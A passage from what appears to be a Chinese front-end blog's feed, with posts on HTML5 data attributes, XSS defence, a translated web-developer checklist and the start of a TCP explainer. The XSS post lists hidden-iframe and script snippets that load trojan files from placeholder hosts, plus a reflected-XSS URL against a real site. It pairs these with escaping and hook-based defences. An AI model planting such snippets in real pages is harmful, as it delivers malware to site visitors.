&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果我们直接将内容 appendChild 到 DOM 树中，documentFragment 内的内容就会被清空。因为 template 标签内容就是一个 documentFragment 的 shadowDOM，所以应该使用 cloneNode 或者 importNode 方法将内容复制到 DOM 中，这样才能保证这个 shadowDOM 内容不被清空。&lt;/p&gt;
&lt;p&gt;##html5的data-*&lt;br&gt;在模板利用扩展之后，我又想起了之前看过的同样是html5标签的data-。&lt;/p&gt;
&lt;p&gt;####作用&lt;br&gt;存储页面或应用程序的私有自定义数据。同时存储的（自定义）数据能够被页面的 JavaScript 中利用，以创建更好的用户体验（不进行 Ajax 调用或服务器端数据库查询）。&lt;/p&gt;
&lt;p&gt;####格式&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;属性名=&amp;quot;属性值&amp;quot;  ==&amp;gt;  data-name=&amp;quot;value&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;####实例&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;span data-my-name=&amp;quot;tony&amp;quot; data-age=&amp;quot;20&amp;quot; id=&amp;quot;info&amp;quot;&amp;gt;&amp;lt;/span&amp;gt;

&amp;lt;h1 id=&amp;quot;name&amp;quot;&amp;gt;&amp;lt;/h1&amp;gt;
&amp;lt;h2 id=&amp;quot;age&amp;quot;&amp;gt;&amp;lt;/h2&amp;gt;
&amp;lt;script&amp;gt;
    var info = document.getElementById(&amp;quot;info&amp;quot;);
    document.getElementById(&amp;quot;name&amp;quot;).innerHTML = info.dataset.myName;
    document.getElementById(&amp;quot;age&amp;quot;).innerHTML = info.dataset.age;
&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;是不是显得非常地多余。但是我们可以定义多种数据，有的情况下需要，有时不需要，那么我们就可以通过script操作来实现。&lt;/p&gt;
&lt;p&gt;####data-*在script中如何使用&lt;br&gt;1.getAttribute与setAttribute存取dataset&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;var name = document.getElementById(&amp;quot;info&amp;quot;).getAttribute(&amp;quot;data-my-name&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;2.通过Dataset&lt;/p&gt;
&lt;p&gt;返回一个集合&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;var dataset = document.getElementById(&amp;quot;info&amp;quot;).dataset;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;某个具体数据&lt;/p&gt;
&lt;p&gt;data-name 的data就可以直接省略，但是name的内容必须以驼峰式来进行命名。如data-git-hub就直接转为gitHub。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;var name = document.getElementById(&amp;quot;info&amp;quot;).dataset.myName;    
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;####data-*浏览器支持情况&lt;/p&gt;
&lt;p&gt;HTML5 Data属性的支持情况在IE上很糟糕。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Internet Explorer: 11+&lt;/li&gt;
&lt;li&gt;Chrome: 8+&lt;/li&gt;
&lt;li&gt;Firefox: 6+&lt;/li&gt;
&lt;li&gt;Opera: 11.1+&lt;/li&gt;
&lt;li&gt;Safari: 6+&lt;/li&gt;
&lt;li&gt;Android Browser: 4+&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;学习网站：&lt;br&gt;&lt;a href=&quot;http://www.w3.org/TR/html5/scripting-1.html#the-template-element&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.w3.org/TR/html5/scripting-1.html#the-template-element&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;##概述&lt;br&gt;首先这篇文章是由于看到 “script” 标签中引用了html内容，觉得甚是奇怪。在之前模模糊糊的印象中见过，但是但是也没有在意。不过今天在看微店[感觉又在打广告]的招聘网站的是否又看到了这个使用的方法，我觉得有必要学习一下。&lt;/p&gt;
&lt;p&gt;####举个栗子&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;script type=&amp;quot;text/template&amp;quot;  id=&amp;quot;test&amp;quot;&amp;gt;
    &amp;lt;div class=&amp;quot;title register&amp;quot;&amp;gt;
        &amp;lt;h1&amp;gt;姓名:&amp;lt;/h1&amp;gt;
        &amp;lt;h2&amp;gt;年龄:&amp;lt;/h2&amp;gt;
    &amp;lt;/div&amp;gt;
&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="blog" scheme="http://zchub.cn/categories/blog/"/>
    
    
      <category term="html5" scheme="http://zchub.cn/tags/html5/"/>
    
      <category term="template" scheme="http://zchub.cn/tags/template/"/>
    
  </entry>
  
  <entry>
    <title>front-end-security-xss</title>
    <link href="http://zchub.cn/2015/09/02/front-end-security-xss/"/>
    <id>http://zchub.cn/2015/09/02/front-end-security-xss/</id>
    <published>2015-09-02T21:25:28.000Z</published>
    <updated>2016-03-21T09:52:03.936Z</updated>
    
    <content type="html">&lt;p&gt;##概述&lt;br&gt;没想到这样一个问题，还把自己搞得有点昏了。不过在找寻答案的过程中，我知道自己是快乐的！虽然没有自己解答出这个问题，但是收获颇多。特别是看了人家一步一步思考问题的方式，感悟是大大的。&lt;/p&gt;
&lt;p&gt;##问题&lt;br&gt;xss作为web前端常用的注入漏洞，在现在的互联网业务中其危险性不亚于其他攻击方式，请编写过滤函数&lt;br&gt;1.通过异步请求拿到的json数据后，如何安全的使用innerHtml显示在页面上&lt;br&gt;2.浏览器地址栏直接获取的参数，如何安全地进行document.write&lt;br&gt;3.后台直接输出完整的html页面，如何保证页面渲染后，用户内容的&amp;lt; script &amp;gt;不被执行.&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;##分析&lt;br&gt;这里提出的就是xxs方式，那么这3个小题中的innerHtml,document.write,script肯定就是“坑”了。&lt;/p&gt;
&lt;p&gt;##前端常见xss&lt;/p&gt;
&lt;p&gt;1.iframe: &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;document.write(&amp;quot;&amp;lt;iframe width=&amp;apos;0&amp;apos; height=&amp;apos;0&amp;apos; src=&amp;apos;地址&amp;apos;&amp;gt;&amp;lt;/iframe&amp;gt;&amp;quot;);     //保存为xxx.js
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;则JS代码为:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;script  src=&amp;apos;xxx.js&amp;apos;&amp;gt;&amp;lt;/script&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;2.js变形加密&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;script language=&amp;quot;JScript.Encode&amp;quot; src=http://www.xxx.com/muma.txt&amp;gt;&amp;lt;/script&amp;gt; //muma.txt 可改成任意后缀
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;3.flash&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://网页木马地址 插入木马地址 width=10 height=10&amp;quot;, &amp;quot;GET&amp;quot; 宽度和高度，方式后面的照添，更改木马地址就可以了。
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;4.隐蔽方式：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;top.document.body.innerHTML=top.document.body.innerHTML+&amp;apos;\r\n&amp;lt;iframe src=&amp;quot;http://www.xxx.com/muma.htm/&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;&amp;apos;[/url]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;5.css中xss：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;body {background-image:url(&amp;apos;javascript:document.write(&amp;quot;&amp;lt;script src=http://www.XXX.net/muma.js&amp;gt;&amp;lt;/script&amp;gt;&amp;quot;)&amp;apos;)}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;6.图片伪装：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt; 
    &amp;lt;iframe src=&amp;quot;网马地址&amp;quot; height=0 width=0&amp;gt;&amp;lt;/iframe&amp;gt; 
    &amp;lt;img src=&amp;quot;图片地址&amp;quot;&amp;gt;&amp;lt;/center&amp;gt; 
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;7.伪装调用：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;frameset rows=&amp;quot;444,0&amp;quot; cols=&amp;quot;*&amp;quot;&amp;gt; 
&amp;lt;frame src=&amp;quot;打开网页&amp;quot; framborder=&amp;quot;no&amp;quot; scrolling=&amp;quot;auto&amp;quot; noresize marginwidth=&amp;quot;0&amp;quot; margingheight=&amp;quot;0&amp;quot;&amp;gt; 
&amp;lt;frame src=&amp;quot;网马地址&amp;quot; frameborder=&amp;quot;no&amp;quot; scrolling=&amp;quot;no&amp;quot; noresize marginwidth=&amp;quot;0&amp;quot; margingheight=&amp;quot;0&amp;quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;##原理&lt;/p&gt;
&lt;p&gt;xss(cross site script)跨站脚本攻击&lt;br&gt;通过属性”src”加载来执行代码在获取网站或者网站服务器的部分或者全部权限后，在网页文件中插入一段恶意代码，&lt;br&gt;来实现攻击。&lt;/p&gt;
&lt;p&gt;##xss类型&lt;br&gt;这个是在阿里面试的时候问道这个问题的，但是之前并没有很详细地区分xss的类型。只知道某种方式。&lt;/p&gt;
&lt;p&gt;1.DOM—based XSS&lt;/p&gt;
&lt;p&gt;该漏洞是基于文档对象模型Document Objeet Model,DOM)触发的。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;div id=&amp;quot;print&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;

//javascript
var text = document.getElementById(&amp;quot;print&amp;quot;);
print.innerHTML = text.value;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;解决方式：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;编码方式&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;//将要转换的字符串设置为这个元素的innerText(ie支持)或者textContent(火狐，google支持)
(temp.textContent != undefined ) ? (temp.textContent = html) : (temp.innerText = html);

//返回这个元素的innerHTML，即得到经过HTML编码转换的字符串了
var output = temp.innerHTML;
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;解码方式&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;//将要转换的字符串设置为这个元素的innerHTML(ie，火狐，google都支持)
temp.innerHTML = text;

//返回这个元素的innerText(ie支持)或者textContent(火狐，google支持)，即得到经过HTML解码的字符串了。
var output = temp.innerText || temp.textContent;
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;2.存储型xss&lt;/p&gt;
&lt;p&gt;即通常我们在录入数据时通过闭合标签的方式把数据存储到数据库中，再次显示的时候触发。&lt;/p&gt;
&lt;p&gt;解决方式：转义标签&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;如：
    &amp;lt;  转义为  &amp;amp;lt； 
    &amp;gt;  转义为  &amp;amp;gt； 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;3.反射型xss&lt;/p&gt;
&lt;p&gt;仍然来自于直接的用户输入，是在通过url控制了页面的输出（处理：转义字符）根据浏览器去bypass各种过滤，易用性稍微差一些。但最后在页面中显示出来，并需要用户自己去点击链接才能触发XSS的是反射型XSS。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;如：

    http://www.jpl.nasa.gov/about_JPL /maps.cfm?departure=lax%22 %3Cimg%20src=k.png%20onerror=alert(%22XSSed%20by%20sH%22)%20/%3E
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;##MutationEvent何许&lt;br&gt;HTML5中添加，提供主动防御&lt;/p&gt;
&lt;p&gt;文章参考：&lt;a href=&quot;http://fex.baidu.com/blog/2014/06/xss-frontend-firewall-2/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://fex.baidu.com/blog/2014/06/xss-frontend-firewall-2/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;##javascript hook&lt;br&gt;简单钩子实现    &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;//暂存变量
&amp;lt;script&amp;gt;
    var zc = Document.prototype.createElement;

    Document.prototype.createElement = function() {

        // 调用原生函数
        var element = zc.apply(this, arguments);

        // 为脚本元素安装属性钩子
        if (element.tagName == &amp;apos;SCRIPT&amp;apos;) {
            element.__defineSetter__(&amp;apos;src&amp;apos;, function(url) {
                console.log(&amp;apos;设置路径:&amp;apos;, url);
            });
        }

        // 返回元素实例
        return element;
    };
&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;测试钩子&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;button id=&amp;quot;btn&amp;quot;&amp;gt;创建脚本&amp;lt;/button&amp;gt;
&amp;lt;script&amp;gt;
    btn.onclick = function() {
        var el = document.createElement(&amp;apos;script&amp;apos;);
        el.src = &amp;apos;http://www.etherdream.com/xss/out.js?dynamic&amp;apos;;
        document.body.appendChild(el);
    };
&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;算了，装不下去了。自己也B不清楚，所以下面是广告时间。请使劲戳下面链接。&lt;/p&gt;
&lt;p&gt;经典文章：&lt;a href=&quot;http://fex.baidu.com/blog/2014/06/xss-frontend-firewall-3/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://fex.baidu.com/blog/2014/06/xss-frontend-firewall-3/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;学习地址：&lt;br&gt;&lt;a href=&quot;http://bbs.ikaka.com/showtopic-8625758.aspx&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://bbs.ikaka.com/showtopic-8625758.aspx&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;##概述&lt;br&gt;没想到这样一个问题，还把自己搞得有点昏了。不过在找寻答案的过程中，我知道自己是快乐的！虽然没有自己解答出这个问题，但是收获颇多。特别是看了人家一步一步思考问题的方式，感悟是大大的。&lt;/p&gt;
&lt;p&gt;##问题&lt;br&gt;xss作为web前端常用的注入漏洞，在现在的互联网业务中其危险性不亚于其他攻击方式，请编写过滤函数&lt;br&gt;1.通过异步请求拿到的json数据后，如何安全的使用innerHtml显示在页面上&lt;br&gt;2.浏览器地址栏直接获取的参数，如何安全地进行document.write&lt;br&gt;3.后台直接输出完整的html页面，如何保证页面渲染后，用户内容的&amp;lt; script &amp;gt;不被执行.&lt;/p&gt;
    
    </summary>
    
      <category term="blog" scheme="http://zchub.cn/categories/blog/"/>
    
    
      <category term="front-end" scheme="http://zchub.cn/tags/front-end/"/>
    
      <category term="xss" scheme="http://zchub.cn/tags/xss/"/>
    
      <category term="hook" scheme="http://zchub.cn/tags/hook/"/>
    
      <category term="前端安全" scheme="http://zchub.cn/tags/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Web应用编程者在发布站点应该注意的细节</title>
    <link href="http://zchub.cn/2015/08/27/what-technical-detail-should-programmer-consider-in-making-site/"/>
    <id>http://zchub.cn/2015/08/27/what-technical-detail-should-programmer-consider-in-making-site/</id>
    <published>2015-08-27T22:23:00.000Z</published>
    <updated>2016-03-21T09:52:03.936Z</updated>
    
    <content type="html">&lt;p&gt;##概述&lt;br&gt;这次装逼真的是到位了。不过自己真的觉得挺有意思的。花了将近一天的时间来翻译这篇文章，其间有抓脑袋，有使用百度翻译。但是每个字都是自己亲手敲的！这篇文章也写得非常好，总让我觉得自己翻译出来有点曲解作者的意思。这篇文章是我在&lt;a href=&quot;http://stackoverflow.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;stack overflow&lt;/a&gt;上看到的。&lt;/p&gt;
&lt;p&gt;原文地址：&lt;a href=&quot;http://programmers.stackexchange.com/questions/46716/what-technical-details-should-a-programmer-of-a-web-application-consider-before&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;戳这里&lt;/a&gt;,最好还是自己去拼读，会有收获的。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;##译&lt;br&gt;这里可能大多数在列表中你已经知道，但是可能有一两条你原来没有见过。不要完全理解，否则可能从来没有听说过。&lt;/p&gt;
&lt;p&gt;####接口和用户体验&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;保证你的站点兼容主流浏览器. 如Gecko engine (Firefox), a WebKit engine (Safari和手机浏览器),Chrome, 你支持IE浏览器(最好兼容性VPC图像),和Opera. 在不同操作系统上浏览器如何渲染你的站点&lt;/li&gt;
&lt;li&gt;考虑用户可能不使用主流浏览器：如cell phones, screen readers and search engines和其他一些信息工具WAIandSection508, Mobile development:MobiForge&lt;/li&gt;
&lt;li&gt;阶段：怎样发布更新而不影响你的用户。有一个或多个测试或分段环境，可实现对体系结构、代码或扫描内容的更改，并确保它们可以被部署在一个没有破坏任何东西的控制方式中。有一个自动化的方式，然后部署到现场的现场现场。而最有效实现这些东西是使用控制版本系统（CVS、Subversion等）和自动构建工具(Ant, NAnt等).&lt;/li&gt;
&lt;li&gt;不要直接给用户展示不友好的错误&lt;/li&gt;
&lt;li&gt;不要在页面中展示用户的邮件地址不然他们会收到太多的垃圾邮件&lt;/li&gt;
&lt;li&gt;添加rel=”nofollow”属性让用户的链接避免垃圾留言&lt;/li&gt;
&lt;li&gt;在你的站点中建立精细的限制（同属于安全问题）&lt;/li&gt;
&lt;li&gt;学习怎么样渐进增强&lt;/li&gt;
&lt;li&gt;重定向一个post请求如果这个post请求成功来防止刷新再一次提交&lt;/li&gt;
&lt;li&gt;不要忘记可访问这个用户。在法律上这是必要的。WAI-ARIA和WCAG 2是这方面的好的资源&lt;/li&gt;
&lt;li&gt;Don’t make me think&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;####安全性&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;这里有太多内容，但是OWASP发展指导从上到下包含了web站点的安全&lt;/li&gt;
&lt;li&gt;了解注入特别是sql注入，以及怎样防御它&lt;/li&gt;
&lt;li&gt;不要相信用户的输入信息和请求中的信息（包含cookie和字段中隐藏值）&lt;/li&gt;
&lt;li&gt;先撒“佐料”（加密），然后再散列密码。并采用不同的加密方式来避免rainbow攻击。使用一个慢散列算法，如bcrypt（时间测试）或scrypt（更安全，但是更新）来保存密码。（怎么安全保存A密码）。NIST提出了PBKDF2来散列密码，避免直接使用MD5或SHA。、&lt;/li&gt;
&lt;li&gt;尽量不要提出你自己的花哨的认证系统。它更容易变得微妙并不可测试，甚至你被黑了你也不知道。&lt;/li&gt;
&lt;li&gt;了解信用卡的规则&lt;/li&gt;
&lt;li&gt;使用SSL/HTTPS来进行登录和其他需要敏感数据的页面。&lt;/li&gt;
&lt;li&gt;防止session攻击&lt;/li&gt;
&lt;li&gt;避免跨脚本攻击cross site scripting(XSS).&lt;/li&gt;
&lt;li&gt;避免跨站点请求cross site request forgeries(CSRF).&lt;/li&gt;
&lt;li&gt;避免点击劫持Clickjacking.&lt;/li&gt;
&lt;li&gt;让你的系统保存更新到你最近一次修改&lt;/li&gt;
&lt;li&gt;保证你的数据库连接信息安全&lt;/li&gt;
&lt;li&gt;了解最新的攻击技术和漏洞来完善你的平台&lt;/li&gt;
&lt;li&gt;阅读google浏览器安全手册&lt;/li&gt;
&lt;li&gt;阅读web应用黑客手册&lt;/li&gt;
&lt;li&gt;了解最小特权原则，尝试去允许你的app服务器在没有权限的情况下&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;####优化&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果必要实现缓存，熟悉并使用HTTP缓存和HTML5 Manifest.&lt;/li&gt;
&lt;li&gt;优化图片。不要使用一张20kb的图片当背景&lt;/li&gt;
&lt;li&gt;学习怎么样压缩内容&lt;/li&gt;
&lt;li&gt;合并多个css文件（stylesheets）和脚本文件（script）来减少浏览器连接的数量并提高压缩的能力来压缩重复的文件&lt;/li&gt;
&lt;li&gt;看哈雅虎优化站点，大量的指导。包含了提高前端的表现性能和他们的YSlow工具（包含了firefox,safari,chrome和opera）,同时google页面测试来进行性能分析同时他也会优化你的图片。&lt;/li&gt;
&lt;li&gt;使用css精灵（css sprites）对于小的关联的图片如导航栏（最小化http请求）&lt;/li&gt;
&lt;li&gt;针对访问量大的网站应该分域部署部件&lt;/li&gt;
&lt;li&gt;静态内容 (i.e. images, CSS, JavaScript, 和不需要通过cookie访问的内容) 应该在一个分开的域并不使用cookie，因为一个域的所有cookie和它的子域会在包含每个请求中来访问这个域。一个好的方法是使用CDN（content delivery network）.但是考虑到CDN方式有可能失效在可选择域中，所以可以用本地拷贝来代替&lt;/li&gt;
&lt;li&gt;最小化http请求数量让浏览器来渲染页面&lt;/li&gt;
&lt;li&gt;在JavaScript中利用google 闭包编译器和其他最小化的工具&lt;/li&gt;
&lt;li&gt;保证站点的根目录下有favicon.ico文件。浏览器会自动请求这个文件。即使这个图标没有在html出现。如果你没有favicon.ico将会导致大量的404错误，耗费你服务器的带宽。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;####SEO (优化搜索引擎)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用对搜索引擎友好的url.。如使用example.com/pages/45-article-title代替example.com/index.php?page=45&lt;/li&gt;
&lt;li&gt;当使用“#”来代替动态内容的时候使用‘！#’代替‘#’，在服务器端googlebot(google页面机器人)使用$_REQUEST[“_escaped&lt;em&gt;fragment&lt;/em&gt;“]代替“！#”，其他的如./#!page=1 变为了./?_escaped&lt;em&gt;fragments&lt;/em&gt;=page=1。用户可能使用FF4或者Chromium；ls一个是好的命令。所以即使这个页面地址栏已经改变页面也没有重载。你可以使用？代替！#来保存动态的内容同时告诉服务器当你发邮件是这个链接是在页面的最后，AJAX 不需要其他的请求。&lt;/li&gt;
&lt;li&gt;不要使用链接如“click here”.你失去了一个SEO的机会，对于屏幕阅读者来说更难。&lt;/li&gt;
&lt;li&gt;拥有XML 站点图,最好默认路径为/sitemap.xml.&lt;/li&gt;
&lt;li&gt;使用&lt;link rel=&quot;canonical&quot; ...=&quot;&quot;&gt;当你有很多链接指向同一内容时，这个问题能够在Google Webmaster Tools上得到解决&lt;/li&gt;
&lt;li&gt;使用Google Webmaster 和Bing Webmaster .&lt;/li&gt;
&lt;li&gt;在开始安装Google Analytics（或者开源工具Piwik）&lt;/li&gt;
&lt;li&gt;了解robot.text以及搜索引擎蜘蛛如何工作的&lt;/li&gt;
&lt;li&gt;重定向请求（使用301永久移除）从www.example.com到example.com来防止在所有站点中降低排名&lt;/li&gt;
&lt;li&gt;了解会有表现怪异的引擎蜘蛛&lt;/li&gt;
&lt;li&gt;如果你又非分本内容在谷歌的地图扩展视频等，这有一些比较好的消息在Tim Farley’s answer中。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;####技术&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;了解http和诸如GET, POST, sessions, cookies等，并了解“无状态”的意义&lt;/li&gt;
&lt;li&gt;根据w3c规则书写自己的XHTML/HTML和CSS并保证他们有效。目的是为了避免浏览器的怪异模式。这样他们就能在非传统的浏览器上运行，如屏幕阅读器和手机设备。&lt;/li&gt;
&lt;li&gt;了解JavaScript在浏览器中的运行过程&lt;/li&gt;
&lt;li&gt;了解在你页面中的JavaScript和层叠样式以及其他资源如何加载并思考如何提高性能。将script脚本放置在页面的底部已被广泛认同如解析apps or HTML5 shims.&lt;/li&gt;
&lt;li&gt;了解JavaScript的沙箱（sandbox）,特别是你要使用iframe&lt;/li&gt;
&lt;li&gt;意识到JavaScript可能现在能运行但将来可能会失效，所以Ajax就被扩展了，而不是一个基础。甚至大多数用户都远离它了，记住noscript(无脚本，静态页面【我的理解】)越来越流行，手机设备可能不会按照期望运行，而且google访问你的站点时将不会运行你的大多数JavaScript文件&lt;/li&gt;
&lt;li&gt;学习301与302重定向的区别（SEO问题）&lt;/li&gt;
&lt;li&gt;尽量多地学习部署平台&lt;/li&gt;
&lt;li&gt;考虑使用重叠样式表和普通css&lt;/li&gt;
&lt;li&gt;学习javascript框架（如jQuery,MooTools,Prototype,Dojo或者YUI 3），将会隐藏多数浏览器差别当操作DOM时&lt;/li&gt;
&lt;li&gt;优化和js框架一起运用，考虑使用服务如google library API来加载框架。所以浏览器能够使用框架的备份已经在浏览器中缓存而不是从你的站点下载一个重复的文件&lt;/li&gt;
&lt;li&gt;不要重复造轮子。在做任何事前搜索一个组件或者例子了解怎么完成它，有９９％的可能有人已经做过并发布了开源代码&lt;/li&gt;
&lt;li&gt;另一方面，你决定你需要什么之前不需要太多东西。特别是在客户端网络，它几乎总是更重要的是要保持东西轻，快速，灵活。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;####Bug修复&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;明白你将使用２０％的时间来编码。８０％的时间来完善它，所以有针对性&lt;/li&gt;
&lt;li&gt;建立一个好的错误报告方式。&lt;/li&gt;
&lt;li&gt;为人们新建一个系统来提出建议和意见&lt;/li&gt;
&lt;li&gt;经常备份(确保这些备份都是功能性的)，要有恢复策略不止是备份策略&lt;/li&gt;
&lt;li&gt;使用版本控制系统来保存你的文件，如git、subversion、Mercurial等&lt;/li&gt;
&lt;li&gt;不要忘记验收测试，如Selenium框架。除非你完全自动化测试，可能使用一个连续整合的工具，如Jenkins.&lt;/li&gt;
&lt;li&gt;确保你的系统使用了日志框架，如log4j,log4net或者log4r。如果你的站点出了什么问题，你可以及时查看&lt;/li&gt;
&lt;li&gt;记录日志的时候捕捉你处理过的异常和没有处理的异常。总结/分析    输出日志。它将展示出你的站点的关键问题。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;####其他的&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;实现服务器端和客户端的监控和分析（应该主动而不是被动）&lt;/li&gt;
&lt;li&gt;使用诸如userservice和Intercom 等服务来与你的用户联系&lt;/li&gt;
&lt;li&gt;采用Vincent Driessen’s Git branching model&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;大多数遗漏的东西并不是很有效，也有可能他们太详细，不在范围之内，或者与其他人了解的差不多。请随时补充，可能我也有遗留的地方或者有些错误。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;##概述&lt;br&gt;这次装逼真的是到位了。不过自己真的觉得挺有意思的。花了将近一天的时间来翻译这篇文章，其间有抓脑袋，有使用百度翻译。但是每个字都是自己亲手敲的！这篇文章也写得非常好，总让我觉得自己翻译出来有点曲解作者的意思。这篇文章是我在&lt;a href=&quot;http://stackoverflow.com/&quot;&gt;stack overflow&lt;/a&gt;上看到的。&lt;/p&gt;
&lt;p&gt;原文地址：&lt;a href=&quot;http://programmers.stackexchange.com/questions/46716/what-technical-details-should-a-programmer-of-a-web-application-consider-before&quot;&gt;戳这里&lt;/a&gt;,最好还是自己去拼读，会有收获的。&lt;/p&gt;
    
    </summary>
    
      <category term="blog" scheme="http://zchub.cn/categories/blog/"/>
    
    
      <category term="front-end" scheme="http://zchub.cn/tags/front-end/"/>
    
      <category term="article_tanslate" scheme="http://zchub.cn/tags/article-tanslate/"/>
    
  </entry>
  
  <entry>
    <title>深入理解tcp协议</title>
    <link href="http://zchub.cn/2015/08/24/tcp/"/>
    <id>http://zchub.cn/2015/08/24/tcp/</id>
    <published>2015-08-24T22:54:00.000Z</published>
    <updated>2016-03-21T09:52:03.936Z</updated>
    
    <content type="html">&lt;p&gt;##TCP协议&lt;br&gt;今天和屌哥深入理解探讨了一下tcp协议，真的非常有意思！&lt;/p&gt;
&lt;p&gt;TCP的传输是面向字节流的，但是它的传送的数据单元确是&lt;b&gt;报文段&lt;/b&gt;。  其中的报文段理解透了就能掌握TCP的工作原理。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;报文段如图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xklhg.com1.z0.glb.clouddn.com/gitcafe_tcp.gif&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;其中理解的重点就是序号[seq]、确认号[ack]、以及6个控制位中的确认ACK,推送PSH(Push)、复位（Reset）、同步SYN、终止FIN等状态，还有就是窗口。&lt;/p&gt;
&lt;p&gt;&lt;b&gt;序号&lt;/b&gt;：本报文段所发送的数据的第一个字节的序号。&lt;br&gt;&lt;b&gt;确认号ack&lt;/b&gt;：期待收到对方下一个报文段的第一个数据字节的序号。&lt;br&gt;&lt;b&gt;确认ACK&lt;/b&gt;：占1位，仅当ACK=1时，确认号字段才有效。ACK=0时，确认号无效。&lt;br&gt;&lt;b&gt;同步SYN&lt;/b&gt;：连接建立时用于同步序号。当SYN=1，ACK=0时表示：这是一个连接请求报文段。&lt;br&gt;若同意连接，则在响应报文段中使得SYN=1，ACK=1。因此，SYN=1表示这是一个连接请求，或连接接受报文。&lt;br&gt;&lt;b&gt;终止FIN&lt;/b&gt;：用来释放一个连接。FIN=1表示：此报文段的发送方的数据已经发送完毕，并要求释放运输连接。&lt;/p&gt;
&lt;p&gt;###TCP运输&lt;br&gt;运输分为3个阶段&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;建立连接&lt;/li&gt;
&lt;li&gt;数据传送&lt;/li&gt;
&lt;li&gt;连接释放&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;而建立连接，就是我们说的TCP连接处理的问题就是&lt;/p&gt;
